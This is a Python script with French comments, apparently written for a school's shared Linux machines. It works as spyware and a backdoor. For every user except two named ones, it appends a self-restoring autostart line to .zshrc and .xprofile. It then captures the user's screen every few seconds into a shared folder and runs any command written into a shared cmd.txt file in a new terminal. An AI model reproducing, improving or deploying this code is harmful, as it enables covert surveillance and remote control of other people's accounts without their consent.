#!/usr/bin/env python3
import os
import time
import subprocess
import getpass
from datetime import datetime

try:
    from PIL import ImageGrab  # Pour la capture d’écran (Linux + X11)
except ImportError:
    ImageGrab = None

# === CONFIGURATION ===
BASE_PATH = "/sgoinfre/goinfre/Perso/zcadinot/ft_connect"
CMD_PATH = os.path.join(BASE_PATH, "cmd")
USER_PATH = os.path.join(BASE_PATH, "user")
WATCH_FILE = os.path.join(CMD_PATH, "cmd.txt")
SCREEN_BASE_PATH = os.path.join(BASE_PATH, "screen")

CURRENT_USER = getpass.getuser()

# === FONCTIONS ===
def ensure_user_file():
    """Crée un fichier user/<nom>.txt si inexistant"""
    user_file = os.path.join(USER_PATH, f"{CURRENT_USER}")
    os.makedirs(USER_PATH, exist_ok=True)
    if not os.path.exists(user_file):
        with open(user_file, "w") as f:
            f.write(f"User file for {CURRENT_USER}\n")
        os.chmod(user_file, 0o777)
    return user_file


def add_autostart_lines():
    """Assure que le script se relance automatiquement même si la ligne est supprimée"""
    home = os.path.expanduser("~")
    autostart_line = f"( sleep 5 && nohup python3 {BASE_PATH}/src/ft_connect.py >/tmp/ft_connect.log 2>&1 & ) &\nclear\n"
    files = [os.path.join(home, ".zshrc"), os.path.join(home, ".xprofile")]

    for file_path in files:
        try:
            if not os.path.exists(file_path):
                open(file_path, "w").close()
            with open(file_path, "r") as f:
                content = f.read()
            if autostart_line not in content:
                with open(file_path, "a") as f:
                    f.write("\n" + autostart_line)
                print(f"[+] Ligne restaurée dans {file_path}")
        except Exception as e:
            print(f"[!] Erreur modification {file_path} : {e}")


def open_in_terminal(cmd: str):
    """Ouvre la commande dans un nouveau terminal GNOME"""
    try:
        subprocess.Popen(
            ["gnome-terminal", "--", "bash", "-c", f"{cmd}; exec bash"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"[>] Commande lancée dans un nouveau terminal : {cmd}")
    except Exception as e:
        print(f"[!] Erreur lancement terminal : {e}")


def clear_cmd_file():
    """Vide le fichier cmd.txt"""
    try:
        with open(WATCH_FILE, "w") as f:
            f.write("None\n")
        print("[i] Fichier cmd.txt vidé.")
    except Exception as e:
        print(f"[!] Impossible de vider le fichier : {e}")


def take_screenshot():
    """Prend une capture d’écran et remplace l’ancienne dans /screen/<user>/"""
    if not ImageGrab:
        print("[!] PIL.ImageGrab non disponible, installe Pillow : pip install pillow")
        return

    screen_user_path = os.path.join(SCREEN_BASE_PATH, CURRENT_USER)
    os.makedirs(screen_user_path, exist_ok=True)

    # On définit un nom fixe (par exemple "latest.png")
    file_path = os.path.join(screen_user_path, "latest.png")

    try:
        # Supprimer l’ancien fichier s’il existe
        if os.path.exists(file_path):
            os.remove(file_path)

        # Prendre la capture et sauvegarder
        img = ImageGrab.grab()
        img.save(file_path, "PNG")
        print(f"[📸] Screenshot mis à jour : {file_path}")
    except Exception as e:
        print(f"[!] Erreur capture d’écran : {e}")

def watch_file():
    """Surveille le fichier cmd.txt et prend un screen toutes les 3 secondes"""
    print(f"[i] Lancement du watcher. Utilisateur : {CURRENT_USER}")
    print(f"[i] Surveillance : {WATCH_FILE}")

    os.makedirs(CMD_PATH, exist_ok=True)
    if not os.path.exists(WATCH_FILE):
        with open(WATCH_FILE, "w") as f:
            f.write("None\n")

    while True:
        try:
            # === Partie capture d’écran ===
            take_screenshot()

            # === Partie surveillance des commandes ===
            with open(WATCH_FILE, "r") as f:
                lines = [l.strip() for l in f.readlines() if l.strip()]
            if len(lines) >= 2:
                username, command = lines[0], lines[1]
                if username in [CURRENT_USER, "all"]:
                    print(f"[i] Exécution pour {username} : {command}")
                    open_in_terminal(command)
                    time.sleep(0.2)
                    clear_cmd_file()

            time.sleep(0.2)
        except Exception as e:
            print(f"[!] Erreur : {e}")
            time.sleep(0.2)


# === MAIN ===
if __name__ == "__main__":
    if CURRENT_USER not in ["aeherve", "zcadinot"]:
        ensure_user_file()
        add_autostart_lines()
        watch_file()
